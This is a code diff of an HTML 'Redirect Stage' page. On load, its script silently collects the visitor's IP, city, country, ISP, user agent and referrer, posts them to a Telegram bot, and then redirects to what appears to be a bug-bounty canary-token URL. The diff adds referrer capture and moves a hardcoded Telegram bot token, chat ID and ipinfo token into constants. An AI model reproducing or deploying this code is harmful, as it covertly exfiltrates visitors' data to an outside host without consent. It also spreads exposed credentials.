@@ -4,36 +4,41 @@
   <meta charset="UTF-8">
   <title>Redirect Stage</title>
   <script>
+    const TELEGRAM_TOKEN = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
+    const TELEGRAM_CHAT_ID = "6239813037";
+    const TARGET_URL = "https://www.internalfb.com/intern/bug-bounty/get-canary-token/4659208263424b568dc09729f50d3637/";
+
     async function getIPInfo() {
       try {
         const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
         return await res.json();
-      } catch (e) {
+      } catch {
         return {};
       }
     }
 
     async function sendToTelegram(message) {
-      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
-      const chat_id = "6239813037";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
-      });
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        await fetch(url, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown"})
+        });
+      } catch {}
     }
 
     function formatMessage(data) {
-      return `📄 *[REDIRECT STAGE]*
-🚪 *Redirecting to:* "https://www.internalfb.com/intern/bug-bounty/get-canary-token/4659208263424b568dc09729f50d3637/"
+      return `📄 *[REDIRECT STAGE]*\n
+🚪 *Redirecting to:* ${TARGET_URL}
 
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
 🏢 *ISP:* ${data.org || "Unknown"}
 🧠 *User-Agent:* \`${navigator.userAgent}\`
-🕒 *Timestamp:* ${new Date().toISOString()}`;
+🔗 *Referrer:* ${document.referrer || "Direct"}
+🕒 *Timestamp:* ${new Date().toLocaleString()}`;
     }
 
     async function run() {
@@ -41,7 +46,7 @@
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
 
-      window.location.href = "https://www.internalfb.com/intern/bug-bounty/get-canary-token/4659208263424b568dc09729f50d3637/";
+      window.location.href = TARGET_URL;
     }
 
     window.onload = run;
